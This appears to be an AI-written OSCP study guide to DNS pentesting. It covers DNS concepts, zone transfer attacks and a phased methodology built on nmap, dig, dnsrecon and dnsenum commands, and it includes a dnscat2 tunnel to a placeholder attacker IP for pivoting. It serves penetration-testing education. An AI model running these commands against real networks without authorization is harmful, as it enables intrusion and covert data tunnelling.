
# ğŸ§¬ **DNS â€” Domain Name System (Pentesting Guide)**

**Ports:** `53/UDP`, `53/TCP`
**Goal:** Discover hosts, subdomains, internal infrastructure, credentials, and pivot paths

---

## ğŸŒ What is DNS?

DNS is the **phonebook of the Internet**.

You type:

```
www.example.com
```

DNS returns:

```
192.0.2.1
```

Browsers communicate using **IP addresses**, not names.
DNS performs this translation.

---

## ğŸ§­ How DNS Works (Big Picture)

```
You â†’ DNS Resolver â†’ DNS Servers â†’ IP Address â†’ Website
```

---

## ğŸ§‘â€ğŸ’» 1. DNS Resolver

> The client-side component that initiates DNS queries

Typically:

* Operating System resolver
* Router
* ISP DNS
* Public DNS (8.8.8.8, 1.1.1.1)

### Function

* Receives domain request
* Queries DNS infrastructure
* Returns IP to browser

### Pentesting Abuse

* Cache poisoning
* Cache snooping
* DNS tunneling

---

## ğŸ›ï¸ 2. DNS Servers

### ğŸ·ï¸ Authoritative DNS Server

> Final authority for a domain

Stores official zone records and provides true answers.

**Pentesting risk:**
Misconfiguration enables **Zone Transfer attacks**.

---

### âš¡ Caching DNS Server

> Stores recent queries to improve performance

Pentesting abuse:

* Cache poisoning
* Cache snooping
* DNS tunneling bypass

---

## ğŸ“ 3. Zone Files

Text files containing all DNS records for a domain.

Example:

```
example.com.        A      192.0.2.1
mail.example.com.   MX     10 mail.example.com.
www.example.com.    CNAME  example.com.
```

### Important DNS Record Types

| Record | Purpose                 |
| ------ | ----------------------- |
| A      | IPv4 address            |
| AAAA   | IPv6 address            |
| MX     | Mail routing            |
| CNAME  | Alias                   |
| NS     | Name server             |
| TXT    | SPF, DKIM, verification |

### Pentesting Value

Zone files reveal:

* Internal servers
* VPN gateways
* Dev / test systems
* Domain controllers

---

# ğŸ§¨ Zone Transfer Attack

A **Zone Transfer Attack** occurs when a DNS server incorrectly allows unauthorized users to download its **entire zone file**.

This exposes the organizationâ€™s **complete network blueprint**.

### Legitimate Use

Primary DNS synchronizes with secondary DNS using AXFR.

```
Primary DNS â”€â”€â”€AXFRâ”€â”€â–¶ Secondary DNS
```

### Attack Scenario

```
Attacker â”€â”€â”€AXFRâ”€â”€â–¶ Misconfigured DNS Server ğŸ’€
```

### Data Exposed

* Subdomains
* Internal hosts
* Mail servers
* VPN endpoints
* Admin portals
* Domain controllers

---

## ğŸ§ª OSCP Workflow for Zone Transfer

```bash
dig NS target.com
dig AXFR target.com @ns1.target.com
```

If successful:

```
vpn.example.com      10.0.0.5
dc01.example.com     10.0.0.1
mail.example.com     10.0.0.10
```

This is **high-value reconnaissance**.

---

## ğŸ›°ï¸ DNS Pentesting Methodology

### Phase 1 â€” Discovery

```bash
sudo nmap -p 53 -sU -sV target
sudo nmap -p 53 -sT target
dig @target-dns-server version.bind CHAOS TXT
```

---

### Phase 2 â€” Enumeration

```bash
dig @target-dns example.com ANY
dig NS example.com
dig MX example.com
```

---

### Phase 3 â€” Zone Transfer

```bash
dig AXFR example.com @target
```

---

### Phase 4 â€” Subdomain Enumeration

```bash
dnsenum example.com
dnsrecon -d example.com -t std
dnsrecon -d example.com -D subdomains.txt -t brt
```

---

### Phase 5 â€” Cache Snooping

```bash
dig @target facebook.com
dig @target internal.example.com
```

---

### Phase 6 â€” DNSSEC Check

```bash
dig +dnssec example.com
```

---

### Phase 7 â€” Nmap DNS Scripts

```bash
nmap -p 53 --script dns-zone-transfer target
nmap -p 53 --script dns-recursion target
nmap -p 53 --script dns-cache-snoop target
```

---

### Phase 8 â€” DNS Pivoting

```bash
dnscat2-server
dnscat2 client <attacker-ip>
```

---

### Phase 9 â€” Active Directory Discovery

```bash
nslookup
set type=SRV
_ldap._tcp.dc._msdcs.domain.local
```

---

## ğŸ§ª Real-World Attack Chain

```
DNS â†’ Subdomain â†’ VPN â†’ Web Panel â†’ Credentials â†’ SMB â†’ AD â†’ Domain Admin
```

---

## ğŸ§  OSCP Focus Areas

| Technique             | Importance |
| --------------------- | ---------- |
| Zone Transfer         | â­â­â­â­â­      |
| Subdomain Enumeration | â­â­â­â­â­      |
| SRV Record Discovery  | â­â­â­â­       |
| DNS Tunneling         | â­â­â­        |
| AD Discovery          | â­â­â­â­â­      |

---

## ğŸ§± Defensive Controls (Report Section)

* Disable public zone transfers
* Restrict recursion
* Enforce DNSSEC
* Monitor DNS abuse

---

## ğŸ OSCP Final DNS Checklist

âœ” Identify DNS
âœ” Enumerate records
âœ” Attempt zone transfer
âœ” Brute subdomains
âœ” Discover AD
âœ” Pivot if required

---

If you'd like, next I can give you a **one-page DNS cheat sheet for OSCP exam time** or a **full lab setup guide (Kali + Windows)**.
